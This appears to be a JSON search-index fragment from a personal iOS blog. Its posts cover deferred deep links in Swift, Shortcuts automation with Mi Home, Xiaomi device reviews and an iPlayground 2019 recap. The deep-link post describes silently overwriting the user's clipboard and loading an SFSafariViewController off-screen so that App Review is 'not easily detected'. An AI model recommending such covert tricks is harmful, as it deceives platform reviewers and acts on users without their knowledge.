Redirect Fl...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS Deferred Deep Link Implementation (Swift)Create a Seamless App Redirect Flow That Adapts to All Scenarios[2022/07/22] Update on iOS 16 Upcoming ChangesStarting from iOS 16, when an app reads the clipboard without user-initiated paste action, a prompt will appear asking for permission. The user must allow it for the app to access the clipboard data.UIPasteBoard‚Äôs privacy change in iOS 16[2020/07/02] Update Due to the iOS 14 update, users will be notified when the clipboard is accessed. Please refer to this article if you want to implement it.UnrelatedAfter graduating and completing my military service, I have been working mediocrely for almost three years. My growth has plateaued, and I started to settle into my comfort zone. Fortunately, I made a firm decision to resign, take a break, and start anew.While reading Design Your Own Life and rethinking my life plan, I reviewed my work and life. Although my technical skills are not very strong, writing on Medium and sharing with others helps me enter a state of ‚Äúflow‚Äù and gain a lot of energy. Recently, a friend asked me about Deep Link issues, so I took the chance to organize my research methods and also recharge my energy!ScenarioFirst, the actual application scenario must be explained. When the user has the app installed and clicks a URL link (from Google search, FB post, Line link, etc.), the app should open directly to the target screen. If not installed, redirect to the App Store to install the app; after installation and opening the app, it should restore the previously intended screen. APP Download and Launch Data Tracking: We want to know how many people actually download and open the APP through the promotion link. Special event entry, such as obtaining rewards by downloading and opening the app through a specific URL. Support Level:iOS ‚â• 9What is the Difference Between Deferred Deep Link and Deep Link?Pure Deep Link itself:You can see that the iOS Deep Link mechanism only checks whether the app is installed; if it is, it opens the app, otherwise it does nothing.First, we need to add a ‚ÄúRedirect to App Store if not installed‚Äù prompt to guide users to install the app:URL Scheme is controlled by the system and is generally used for internal app calls, rarely made public; if the trigger point is outside your control (e.g., Line links), it cannot be handled.If the trigger point is on your own webpage, you can use some tricks to handle it. Please refer to here:&lt;html&gt;&lt;head&gt; &lt;title&gt;Redirect...&lt;/title&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /&gt; &lt;script&gt; var appurl = 'marry://open'; var appstore = 'https://apps.apple.com/tw/app/%E7%B5%90%E5%A9%9A%E5%90%A7-%E6%9C%80%E5%A4%A7%E5%A9%9A%E7%A6%AE%E7%B1%8C%E5%82%99app/id1356057329'; var timeout; function start() { window.location = appurl; timeout = setTimeout(function(){ if(confirm('Install the Marry app now?')){ document.location = appstore; } }, 1000); } window.onload = function() { start() } &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;The general logic is to call the URL Scheme, then set a timeout. If the page hasn‚Äôt redirected by the time expires, assume the app is not installed and cannot call the Scheme, then redirect to the App Store page (but the experience is still poor as an error message may appear, just with automatic redirection added).Universal Link is essentially its own webpage. If no redirection occurs, it defaults to being displayed in a web browser. Here, if a web service is available, you can choose to redirect directly to the webpage; if not, it will redirect to the App Store page.Web service websites can add the following inside the &lt;head&gt;&lt;/head&gt;:&lt;meta name=\"apple-itunes-app\" content=\"app-id=APPID, app-argument=page-parameter\"&gt;When browsing the web version on iPhone Safari, an APP installation prompt and a button to open the current page with the APP will appear at the top; the app-argument parameter is used to pass page values and transmit them to the APP.Add a flowchart for ‚ÄúIf none, redirect to the APP Store‚ÄùImprove Deep Link Handling on the APP Side:What we want is not just ‚Äúopen the app if the user has it installed,‚Äù but also to link the source information with the app so that the app automatically displays the target page when opened.URL Scheme can be handled in AppDelegate within the func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -&gt; Bool method:func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -&gt; Bool { if url.scheme == \"marry\", let params = url.queryParameters { if params[\"type\"] == \"topic\" { let VC = TopicViewController(topicID: params[\"id\"]) UIApplication.shared.keyWindow?.rootViewController?.present(VC, animated: true) } } return true}Universal Link is handled in the AppDelegate within the func application(_ application: UIApplication, continue userActivity: NSUserActivity, restorationHandler: @escaping ([Any]?) -&gt; Void) -&gt; Bool method:extension URL { /// test=1&amp;a=b&amp;c=d =&gt; [\"test\":\"1\",\"a\":\"b\",\"c\":\"d\"] /// Parses the URL query into a [String: String] dictionary public var queryParameters: [String: String]? { guard let components = URLComponents(url: self, resolvingAgainstBaseURL: true), let queryItems = components.queryItems else { return nil } var parameters = [String: String]() for item in queryItems { parameters[item.name] = item.value } return parameters } }First, add an extension method queryParameters to URL for easily converting URL query into a Swift Dictionary.func application(_ application: UIApplication, continue userActivity: NSUserActivity, restorationHandler: @escaping ([Any]?) -&gt; Void) -&gt; Bool { if userActivity.activityType == NSUserActivityTypeBrowsingWeb, let webpageURL = userActivity.webpageURL { /// If the source is a universal link URL... let params = webpageURL.queryParameters if params[\"type\"] == \"topic\" { let VC = TopicViewController(topicID: params[\"id\"]) UIApplication.shared.keyWindow?.rootViewController?.present(VC, animated: true) } } return true }Completed!So what‚Äôs still missing?So far, it looks perfect. We‚Äôve handled all possible scenarios. What else is missing?As shown in the image, if the flow is Not Installed -&gt; Install from APP Store -&gt; Open from APP Store, the source data will be lost. The app won‚Äôt know the source and will only show the home page. The user must go back to the previous webpage and click to open again for the app to trigger the page jump. Although this is not impossible, considering the dropout rate, each extra step adds another layer of loss and disrupts the user experience; moreover, users may not be that smart.Getting to the Point of This ArticleWhat is a Deferred Deep Link? A deferred deep link allows our Deep Link to retain source information even after the app is installed from the App Store.According to Android engineers, Android natively supports this feature, but iOS does not. Achieving this function on iOS is also not user-friendly. Please read on.Deferred Deep Link If you don‚Äôt want to spend time doing it yourself, you can directly use branch.io or Firebase Dynamic Links. The method introduced in this article is the way Firebase uses.There are two common methods online to achieve the effect of Deferred Deep Link:One method is to calculate a hash value using parameters such as the user‚Äôs device, IP, environment, etc., and store the data on the server from the web end; when the app is installed and opened, it calculates the value in the same way, and if the values match, it retrieves the data to restore it (the approach used by branch.io).Another method introduced in this article is similar to the Firebase approach; it uses the iPhone clipboard and the shared cookie mechanism between Safari and the app. This means storing data in the clipboard or cookies, which the app reads and uses after installation.After clicking \"Open,\" your clipboard will be automatically overwritten and copied by JavaScript with the redirect information: https://XXX.app.goo.gl/?link=https://XXX.net/topicID=1&amp;type=topicAnyone who has used Firebase Dynamic Links is surely familiar with this redirect page. Once you understand the principle, you‚Äôll know this page cannot be removed from the flow!Additionally, Firebase does not provide options for style customization.Support LevelFirst, let‚Äôs talk about a pitfall: support issues; as mentioned before, it is ‚Äúunfriendly‚Äù!If the app only supports iOS 10 or above, it becomes much easier. The app can implement clipboard access, the web can use JavaScript to overwrite information to the clipboard, and then redirect to the App Store for download.iOS 9 does not support JavaScript automatic clipboard but supports Safari and APP SFSafariViewController ‚ÄúCookie Sharing Method‚ÄùAdditionally, the app needs to secretly add SFSafariViewController in the background to load the web page, then retrieve the cookie information stored when the link was clicked. The steps are complicated &amp; link clicks are limited to Safari browser.SFSafariViewController According to official documentation, iOS 11 no longer allows access to users‚Äô Safari cookies. If this is needed, SFAuthenticationSession can be used, but this method cannot run stealthily in the background. Each time it loads, the following prompt will appear:SFAuthenticationSession prompt window Also, app review does not allow placing SFSafariViewController where users cannot see it. (Triggering it programmatically and then adding it as a subview is not easily detected)Hands-on PracticeSimply put, only consider users with iOS ‚â• 10, using the iPhone clipboard to transfer information.Web version:We customized our own page by imitating Firebase Dynamic Links. Using the clipboard.js library, when users click ‚ÄúGo Now,‚Äù the information we want to pass to the app (marry://topicID=1&amp;type=topic) is first copied to the clipboard, then location.href is used to redirect to the App Store page.APP Side:Read the clipboard value in AppDelegate or the main UIViewController:let pasteData = UIPasteboard.general.string// Get the string content from the general pasteboardIt is recommended to package the information using URL Scheme for easy identification and data parsing:if let pasteData = UIPasteboard.general.string, let url = URL(string: pasteData), url.scheme == \"marry\", let params = url.queryParameters { if params[\"type\"] == \"topic\" { let VC = TopicViewController(topicID: params[\"id\"]) UIApplication.shared.keyWindow?.rootViewController?.present(VC, animated: true) }}Finally, after completing the actions, use UIPasteboard.general.string = \"\" to clear the information in the clipboard.Hands-on ‚Äî Support for iOS 9 VersionTroubles arise with iOS 9 support. As mentioned earlier, since clipboard sharing is not supported, the Cookie sharing method must be used.Web version:The web side is also easy to handle. Just save the information we want to pass to the APP into a cookie when the user clicks ‚ÄúGo Now‚Äù (marry://topicID=1&amp;type=topic), then use location.href to redirect to the APP Store page.Here are two encapsulated JavaScript methods for handling cookies to speed up development:/// name: Cookie name/// val: Cookie value/// day: Cookie expiration period, default is 1 day/// EX1: setcookie(\"iosDeepLinkData\",\"marry://topicID=1&amp;type=topic\")/// EX2: setcookie(\"hey\",\"hi\",365) = valid for one yearfunction setcookie(name, val, day) { var exdate = new Date(); day = day \\|\\| 1; exdate.setDate(exdate.getDate() + day); document.cookie = \"\" + name + \"=\" + val + \";expires=\" + exdate.toGMTString();}/// getCookie(\"iosDeepLinkData\") =&gt; marry://topicID=1&amp;type=topicfunction getCookie(name) { var arr = document.cookie.match(new RegExp(\"(^\\| )\" + name + \"=([^;]*)(;\\|$)\")); if (arr != null) return decodeURI(arr[2]); return null;}APP side:The most troublesome part of this article is coming.The principle was mentioned earlier: we need to secretly load an SFSafariViewController programmatically in the background of the main UIViewController without the user noticing.Another pitfall: For iOS ‚â• 10, if the SFSafariViewController‚Äôs view size is set smaller than 1, opacity less than 0.05, or isHidden is true, the SFSafariViewController will not load. p.s iOS = 10 supports both Cookies and Clipboard simultaneously.https://stackoverflow.com/questions/39019352/ios10-sfsafariviewcontroller-not-working-when-alpha-is-set-to-0/39216788My approach is to place a UIView with any height above the main UIViewController on the homepage, aligning its bottom to the top of the main UIView. Then, I connect an IBOutlet (sharedCookieView) to the class. In viewDidLoad(), I initialize an SFSafariViewController and add its view to sharedCookieView. So it actually loads and displays, but the screen pops out and the user can‚Äôt see it üåù.What URL should SFSafariViewController point to?Like the web sharing page, we need to create a page for reading cookies and place both pages under the same domain to avoid cross-domain cookie issues. The page content will be provided later.@IBOutlet weak var SharedCookieView: UIView!override func viewDidLoad() { super.viewDidLoad() let url = URL(string:\"http://app.marry.com.tw/loadCookie.html\") let sharedCookieViewController = SFSafariViewController(url: url) VC.view.frame = CGRect(x: 0, y: 0, width: 200, height: 200) sharedCookieViewController.delegate = self self.addChildViewController(sharedCookieViewController) self.SharedCookieView.addSubview(sharedCookieViewController.view) sharedCookieViewController.beginAppearanceTransition(true, animated: false) sharedCookieViewController.didMove(toParentViewController: self) sharedCookieViewController.endAppearanceTransition()}sharedCookieViewController.delegate = selfclass HomeViewController: UIViewController, SFSafariViewControllerDelegateYou need to add this Delegate to capture the callback after the loading is complete.We can at:func safariViewController(_ controller: SFSafariViewController, didCompleteInitialLoad didLoadSuccessfully: Bool) {Capture the load completion event within the method.At this point, you might think the next step is to read the cookies inside the webpage within didCompleteInitialLoad to complete the process!I couldn‚Äôt find a method to read cookies from SFSafariViewController here; using network methods to read them always returns empty. May need to use JavaScript to interact with page content, calling JavaScript to read cookies and return them to the UIViewController.Tricky‚Äôs URL Scheme MethodSince iOS doesn‚Äôt know how to access shared Cookies, we‚Äôll let the ‚Äúpage that reads Cookies‚Äù handle the ‚Äúreading of Cookies‚Äù for us directly.The getCookie() method from the previously mentioned JavaScript cookie handling is used here. Our ‚Äúcookie reading page‚Äù is a blank page (since the user won‚Äôt see it), but in the JavaScript part, the cookie must be read after body onload:&lt;html&gt;&lt;head&gt; &lt;title&gt;Load iOS Deep Link Saved Cookie...&lt;/title&gt; &lt;script&gt; function checkCookie() { var iOSDeepLinkData = getCookie(\"iOSDeepLinkData\"); if (iOSDeepLinkData &amp;&amp; iOSDeepLinkData != '') { setcookie(\"iOSDeepLinkData\", \"\", -1); window.location.href = iOSDeepLinkData; /// marry://topicID=1&amp;type=topic } } &lt;/script&gt;&lt;/head&gt;&lt;body onload=\"checkCookie();\"&gt;&lt;/body&gt;&lt;/html&gt;The actual principle summary is: In HomeViewController viewDidLoad, add SFSafariViewController to stealthily load the loadCookie.html page. The loadCookie.html page reads and checks previously stored cookies; if any exist, it reads and clears them, then uses window.location.href to call and trigger the URL Scheme mechanism.So the corresponding callback handling will return to func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -&gt; Bool in the AppDelegate for processing.Completed! Summary:If it feels cumbersome, you can directly use branch.io or Firebase Dynamic. There‚Äôs no need to reinvent the wheel. Here, we built our own solution due to interface customization and some complex requirements.iOS 9 users are now very rare, so you can safely ignore them unless necessary; using the clipboard method is fast and efficient, and it doesn‚Äôt limit you to opening links only in Safari!If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS ‚â• 13.1 Shortcuts AutomationÔΩúSeamless Integration with Mi Home Smart Devices", "url": "/posts/zrealm-life/ios-13-1-shortcuts-automation-seamless-integration-with-mi-home-smart-devices-21119db777dd/", "categories": "ZRealm Life.", "tags": "english, ai-translation, mijia, ios-13, siri, siri-shortcut, lifestyle", "date": "2019-09-26 22:23:36 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS ‚â• 13.1 Using the ‚ÄúShortcuts‚Äù Automation Feature with Mijia Smart HomeDirec...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS ‚â• 13.1 Using the ‚ÄúShortcuts‚Äù Automation Feature with Mijia Smart HomeDirectly Use the Built-in Shortcuts App in iOS ‚â• 13.1 to Complete Automation TasksIntroductionIn early July this year, I bought two smart devices: the Mi Home Desk Lamp Pro and the Mi Home LED Smart Desk Lamp. The difference is that one supports HomeKit, while the other only supports Mi Home. At that time, I wrote an article titled ‚ÄúSmart Home First Experience ‚Äî Apple HomeKit &amp; Xiaomi Mi Home,‚Äù which mentioned how to complete away and home modes without a HomePod, Apple TV, or iPad. The steps were a bit complicated.This time, iOS ‚â•13.1 (note that automation is available only from version 13.1 onwards) built-in ‚ÄúShortcuts‚Äù app (if you can‚Äôt find it, please download it from the Store) supports automation features; if you use IFTTT or Mi Home, you no longer need to rely on third-party apps! [p.s If you have a HomePod, Apple TV, or iPad, you don‚Äôt need to read this article; just set the device as a Home Hub!] (../c3150cdc85dd/)Achieved ResultsEntering or leaving the set area will trigger a shortcut execution notification, which will run automatically when clicked.How to Use1. First, open the Mi Home appSwitch to ‚ÄúMine‚Äù -&gt; ‚ÄúSmart‚Äù Assuming you have already added the device to Mi Home.Select ‚ÄúManual Execution‚Äù Here, I want to mention again why I don‚Äôt directly use Mi Home‚Äôs ‚Äúleave or arrive at a location.‚Äù First, GPS used in mainland China has deviations, and Xiaomi hasn‚Äôt corrected this. Second, it can only set locations with landmarks on the map, but the Gaode Map in mainland China has very few landmarks in Taiwan.Scroll down to the ‚ÄúSmart Devices‚Äù section, add the device and action to be performed.Click ‚ÄúContinue Adding‚Äù to include all devices to be operated.For example, in the ‚ÄúAway from Home‚Äù mode, I want to turn off the fan and lights; turn on the camera when leaving home.Click the ‚ÄúSave‚Äù button at the top right and enter the name for this smart actionBack to the list, tap ‚ÄúAdd to Siri‚ÄùClick ‚ÄúAdd to Siri‚Äù next to the smart action you want to addType ‚ÄúCall Siri command‚Äù -&gt; ‚ÄúAdd to Siri‚ÄùImportant! Commands must not conflict with built-in iOS commands!2. Open the „Äå Siri Shortcuts „Äç APPSwitch to the ‚ÄúAutomation‚Äù tab and click the ‚Äú+‚Äù button at the top right corner. If the ‚ÄúAutomation‚Äù tab is missing, please check if your iOS version is above 13.1.Choose ‚ÄúCreate Personal Automation‚ÄùSelect type ‚ÄúArrival‚Äù or ‚ÄúDeparture‚ÄùSet ‚ÄúLocation‚ÄùSearch for a location or use the current location, then tap ‚ÄúDone‚ÄùBelow, you can set the automatic execution time range. Click ‚ÄúNext‚Äù at the top right corner.Because leaving and arriving home are events that need to be detected around the clock, no execution time range will be set here!Click ‚ÄúAdd Action‚ÄùSelect ‚ÄúProcess Instruction‚ÄùScroll to the ‚ÄúShortcuts‚Äù section and select ‚ÄúRun Shortcut‚ÄùClick the ‚ÄúShortcuts‚Äù sectionFind the ‚ÄúSiri Command When Calling Siri‚Äù that you just set in Mi Home under ‚ÄúAdd to Siri,‚Äù and select it.Tap ‚ÄúDone‚Äù at the top right cornerThe newly added automation will appear right on the homepage!Done!Actual Execution ResultWhen leaving or entering the set address range, your iPhone and Apple Watch will receive a notification to run the shortcut. Tap it to execute! 1. GPS sensing range has an error margin of 100 meters 2. ‚ÄúAutomation‚Äù here only means automatically notifying you to execute, not truly running actions automatically in the background To solve the above two issues, you can only use what was mentioned at the beginning of the article: buy a HomePod or use an Apple TV/iPad as the home hub.On iPhone:Execution NotificationClick to ‚ÄúExecute‚ÄùPlease note, unlocking the phone will be required first.Failures will also provide feedback!Sometimes, Mi Home devices fail to execute due to network issues.On Apple Watch:Click to executeUnlike IFTTT‚Äôs native apps, its strength lies in the ability to execute actions directly from watch notifications.(IFTTT only sends notifications, and you still need to take out your phone to tap and execute)Besides thatUsing Siri to Trigger ExecutionSince the Mi Home smart operation scenes have been added to Siri, you can now use Siri to execute actions! One step closer to a smart life!Further Reading Smart Home First Experience ‚Äî Apple HomeKit &amp; Xiaomi Mijia (Mijia Smart Camera and Mijia Smart Desk Lamp, HomeKit Setup Tutorial) Xiaomi Smart Home New Purchases (AI Speaker, Temperature and Humidity Sensor, Scale 2, DC Inverter Fan) Mi Home APP / Xiao Ai Speaker Region Issue [Advanced] Demonstrating Using Raspberry Pi as a HomeBridge Host to Connect All Mijia Appliances to HomeKit If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Xiaomi Smart Home DevicesÔΩúAI Speaker, Sensor & DC Fan Integration", "url": "/posts/zrealm-life/xiaomi-smart-home-devices-ai-speaker-sensor-dc-fan-integration-bcff7c157941/", "categories": "ZRealm Life.", "tags": "english, ai-translation, xiaomi, mijia, lifestyle, home-appliances, unboxing", "date": "2019-09-26 21:16:42 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!New Additions to Xiaomi Smart HomeAI Speaker, Temperature and Humidity Sensor,...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!New Additions to Xiaomi Smart HomeAI Speaker, Temperature and Humidity Sensor, Scale 2, DC Inverter Electric Fan User ExperienceGetting StartedFollowing the previous article ‚ÄúFirst Experience with Smart Home ‚Äî Apple HomeKit &amp; Xiaomi Mijia‚Äù where I introduced how to use Xiaomi smart home products; I continued to buy several Xiaomi home products and tried every way to make all appliances smart‚Ä¶ I can only say it‚Äôs really a pitfall. Initially, I just wanted to buy a desk lamp because Xiaomi‚Äôs design looked nice, and then I started exploring smart features, and that‚Äôs how I got hooked!New Purchase ‚Äî Xiaomi AI SpeakerPrice: NT$ 1,495Features: Supports voice control for all connected Mi Home smart devices KKBOX Membership Gift for 3 Months in Taiwan Region Voice intelligence is powerful; compared to Siri, Siri is like a 3-year-old child.¬∂Xiao Ai not only has basic voice assistant functions (checking weather, news, information, controlling home appliances, playing music‚Ä¶)¬∂but also many extended skills (asking about American TV shows, playing mini-games, chatting, telling comic dialogues, acting as a maid, yes, speaking to you in a maid tone!!)¬∂Supports customization (custom words and corresponding actions) Another major difference is that it can infer and extend from one example to others. Unlike Siri, which only answers the weather when asked, Xiao Ai will also ask if you want a reminder to bring an umbrella, making it more thoughtful and warm. 360-degree audio capture and playback with ample volume; calls are very responsive and accurate. Can be used directly as a Bluetooth music speaker Disadvantages: When using Bluetooth speakers, there is a severe 1‚Äì2 second delay when watching videos; this is quite a serious flaw. Checking forums in China shows no solution, and the official response is indifferent, as it seems to be a hardware issue. No support for Spotify / Apple Music. For users like me who are not KKBOX subscribers, after the free 3-month period ends, if you don‚Äôt want to pay, you can only switch to using QQ Music in the mainland China region. Unlike the HomePod, which supports the Home Hub feature, I originally expected to use the Xiaomi speaker as the smart home hub. Then, when I arrive home, the Mi Home app could detect the Xiaomi speaker and automatically perform corresponding actions (like Apple‚Äôs HomePod + HomeKit system). It seems this is not possible! You need to install a separate Xiao Ai Speaker app. Set the same region as the Mi Home app. My Mi Home app is set to Mainland China (for more features), so Xiao Ai can only be set to Mainland China as well. In summary, in daily use, it‚Äôs just a Bluetooth speaker that can only play music, occasionally asking Xiao Ai to remind me when time‚Äôs up‚Ä¶ that‚Äôs it. Actually, Siri can do the same; a Bluetooth speaker that can‚Äôt act as a computer is really disappointing to me. But I have to say, its voice functions are really smart and impressive! It‚Äôs worth buying just for fun.New Purchase ‚Äî Mijia Bluetooth Temperature and Humidity MeterSmall item, NT$ 365You need to buy an additional size 4 battery; the official claim is that the battery life can last up to one year. It has a compact round design with a magnetic mount, making it easy to take off and handle anytime. The dual-row display screen allows you to quickly check the current temperature and humidity.APP Temperature RecordOnly supports Bluetooth connection, so data cannot be read once the phone is out of Bluetooth range; unless you purchase a Bluetooth gateway or other Mi Home devices that support Bluetooth gateway functionality.Official Document Supported Bluetooth Gateway Device ListGenerally, devices that support both WiFi and Bluetooth are compatible, but Xiaomi AI Speaker surprisingly is not!!And I discovered something amazing: the Mijia DC inverter fan actually works, WTF!!!! So currently, I use the Mijia fan to send temperature and humidity sensor data via WiFi to the network for me.Really strange‚Ä¶ Xiaomi AI speaker, desk lamp, table lamp, and camera do not support Bluetooth gateway function, but the electric fan actually does! Not sure if only temperature and humidity meters can do thisAdditionally, the temperature and humidity meter will not continuously send push notificationsPush notifications for temperatures that are too high or humidity that is too high (but these temperature and humidity levels are quite normal in Taiwan‚Ä¶)How to Close:Go to ‚ÄúMy‚Äù -&gt; top right corner ‚ÄúSettings‚Äù -&gt; Device Notifications -&gt; find Mi Home Bluetooth Temperature and Humidity Sensor -&gt; turn offAfter closing, you will no longer receive push notification messages!New Purchase ‚Äî Scale 2It‚Äôs just a scale, NT$ 395In addition to recording weight in the app, it offers functions like weighing objects and balance tests‚Ä¶ but it‚Äôs still mainly a scale, mostly used for measuring body weight; its elegant design enhances the home decor even when not in use!The scale requires downloading a separate Xiaomi Health app. Open the app while weighing to sync and record your weight.Xiaomi Health APPNew Purchase ‚Äî DC Inverter Electric FanThe most satisfying appliance purchased this time, NT$ 1995First, the basic functions of the electric fanThe 120-degree oscillation covers a wide range, and the wind speed can be adjusted in 1‚Äì100 levels, allowing you to control the airflow freely. My favorite feature is the ‚ÄúNatural Wind‚Äù mode because I like direct airflow but often feel uncomfortable after a while. This natural wind keeps the direct airflow on without causing discomfort!Appearance DesignMaintaining Xiaomi‚Äôs simple white design, I personally don‚Äôt like fans that are too metallic (they feel dirty); Xiaomi fans are lightweight and clean, even when not in use, they look pleasant.Intelligence AspectAfter adding it to the Mi Home app, you can control all parameters (mode, power, wind speed, angle) from the app. Additionally, you can set periodic timers (e.g., turn off at 7:00 AM from Monday to Friday) and link it with other Mi Home devices (e.g., automatically turn on when you arrive home, or when the temperature exceeds 30¬∞C). These smart home features offer great flexibility.Additionally, I found that it can act as a Bluetooth gateway, helping to transmit data from the Mi Home Bluetooth temperature and humidity sensor. Not sure if only the temperature and humidity meter can do thisCurrent Device Inventory Mijia Smart Camera PTZ Version 1080P (Supported: Mijia) Mi Home Desk Lamp Pro (Supports: Apple HomeKit, Mi Home) Mi Home LED Smart Desk Lamp (Supported by: Mi Home) Xiaomi AI Speaker Mijia Bluetooth Temperature and Humidity Sensor Xiaomi Body Scale 2 Mijia DC Inverter Electric Fan SummaryThis concludes the summary of my new purchases. There is still a long way to go to reach the ideal setup (automatic air conditioning when the temperature is too high, fan following people, lights turning on when arriving home, lights off and cameras on when leaving, dehumidifier activating when humidity is too high), and the path is quite challenging‚Ä¶ It requires circuit modifications, and I found out my dehumidifier lacks a return function, and the air conditioner is an old model. Many Xiaomi devices are not available in Taiwan (e.g., universal remote). I initially wanted to invest in a smart home kit, but considering the limited use, I will continue researching what else can be made smart!Further Reading Smart Home First Experience ‚Äî Apple HomeKit &amp; Xiaomi Mijia (Mijia Smart Camera and Mijia Smart Desk Lamp, HomeKit Setup Guide) iOS ‚â• 13.1 Automation with ‚ÄúShortcuts‚Äù and Mijia Smart Home (Using the built-in Shortcuts app in iOS ‚â• 13.1 to complete automation) Mi Home APP / Xiao Ai Speaker Region Issue [Advanced] Demonstrating Using Raspberry Pi as HomeBridge Host to Connect All Mijia Appliances to HomeKit If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iPlayground ExperienceÔΩúExplore Cutting-Edge iOS & AI Innovations", "url": "/posts/zrealm-dev/iplayground-experience-explore-cutting-edge-ios-ai-innovations-4079036c85c2/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, iplayground, iplayground2019, ios-app-development, swift, taiwan-ios-conference", "date": "2019-09-22 21:47:18 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!What was the experience like at iPlayground 2019?iPlayground 2019 Hot Particip...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!What was the experience like at iPlayground 2019?iPlayground 2019 Hot Participation ExperienceAbout the EventLast year it was held in mid-October. I only started managing Medium to document my life in early October last year; combining the UUID topic I heard about and my participation experience, I also wrote an article. This year, I continue to write reflections to ride the trend!iPlayground 2019 (This event was also sponsored by the company for corporate tickets)Compared to the first edition in 2018, this year has seen even greater improvements in all aspects!First, regarding the venue, last year the event was held in the basement conference hall, which was small and felt cramped, making it difficult to use computers during lectures; this year, it was moved to the NTU Boya Hall, which is spacious, new, not crowded, and the classrooms have desks and power outlets, making it convenient to use personal computers!Agenda: Besides prominent domestic speakers, this event also invites international guests to share; among them, the packed sessions with no doubt belong to Cat God Wei Wang. This year also features workshops with hands-on teaching for the first time, but spots are limited‚Äîact fast‚Ä¶ If you‚Äôre busy eating and chatting, you‚Äôll miss out.Sponsor Booths and Ask the Speaker AreaThe larger venue made networking easier and there were more activities; at the iChef booth #iCHEFxiPlayground I got a set of eco-friendly straws and dorayaki. At the Dcard booth, I got a sticker set and eco-friendly cup sleeve again this year, plus a nihilistic quote wet wipe. 17 Live had a survey to enter a draw for AirPods 2. I got stickers at the [weak self] podcast booth. There were also interactive booths from Grindr, CakeResume, and Bitrise. Attached is a partial photo of the loot.Incomplete LootFood and After Party: Both days featured exquisite meal boxes, with unlimited iced coffee and tea available all day. Last year, the After Party felt more like being in a bar, listening to the speakers share stories on stage, which was very entertaining. This year, it was more like afternoon tea (still serving alcohol, with delicious shumai and desserts!). People mingled on their own, and I actually made new friends this year.A Must-Have for Foodies: Bento PhotosTop 5 Agenda Takeaways1. Wei Wang (Cat God)‚Äôs Network Request Component DesignThis part resonates deeply because our project does not use third-party networking libraries; instead, we encapsulate methods ourselves. Many design patterns and issues mentioned by the speaker are exactly the optimizations and refactoring tasks we need to undertake. Applying what the speaker said: ‚ÄúTrash needs sorting, and so does code‚Ä¶‚ÄùThis part needs thorough research. I will organize it well &lt;( _ _ )&gt;p.s. Missed out on the KingFisher sticker QQ2. Japan‚Äôs Great kishikawa katsumiIntroduces the new method UICollectionViewCompositionalLayout introduced in iOS ‚â• 13, which allows us to avoid subclassing UICollectionViewLayout or using nested CollectionView Cells to achieve complex layouts as before.This part resonated with me as our app used the latter approach to achieve the desired design style. At its peak, we had CollectionView Cell containing CollectionView, which in turn contained another CollectionView (three layers), making the code messy and hard to maintain.Besides introducing the structure and usage of UICollectionViewCompositionalLayout, the highlight is that the speaker created a project based on this pattern, enabling apps running on iOS 12 and earlier to support the same effects ‚Äî IBPCollectionViewCompositionalLayout. Amazing!3. Ethan Huang Developing Apple Watch Apps with SwiftUI by 